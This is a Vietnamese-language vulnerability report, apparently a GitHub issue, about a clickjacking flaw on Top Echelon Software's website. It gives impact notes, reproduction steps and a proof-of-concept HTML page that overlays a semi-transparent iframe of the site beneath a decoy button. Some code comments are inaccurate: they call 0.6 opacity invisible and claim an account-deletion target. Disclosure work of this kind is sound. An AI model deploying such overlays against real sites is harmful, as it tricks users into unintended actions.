
**Tóm tắt về Lỗ Hổng Clickjacking trên Website của Top Echelon Software**

### 🚨 **Mô tả Lỗ Hổng:**

Website của Top Echelon bị **vulnerable to Clickjacking**, một dạng tấn công web mà kẻ tấn công có thể tạo một **iframe ẩn** chứa nội dung từ trang web mục tiêu, lừa người dùng thực hiện các hành động không mong muốn như nhấp chuột, gửi thông tin hoặc đánh cắp thông tin đăng nhập.

### 🔐 **Tác Động và Nguy Cơ:**

* **Tấn công chiếm đoạt tài khoản**: Nếu người dùng đã đăng nhập và tương tác với iframe, kẻ tấn công có thể ép buộc thực hiện các hành động không mong muốn.
* **Tấn công lừa đảo**: Người dùng có thể vô tình nhập thông tin nhạy cảm mà không nhận ra.
* **Hành động độc hại**: Kẻ tấn công có thể lợi dụng tương tác của người dùng để thay đổi cài đặt, gửi biểu mẫu hoặc thực hiện các hành động khác.

### 📝 **Các Bước Tái Hiện:**

1. Tạo một trang HTML nhúng trang web mục tiêu bằng thẻ `<iframe>`.
2. Sử dụng CSS để làm iframe trong suốt hoặc đặt các yếu tố giao diện khác lên trên để đánh lừa người dùng.
3. Người dùng sẽ bị lừa và tương tác với iframe mà không nhận ra.

**Mã minh họa PoC**:

```html
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>
```
---
```

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
</body>
</html>
```
![image](https://github.com/user-attachments/assets/fb227028-31a6-43f5-925e-55db814f3b0f)

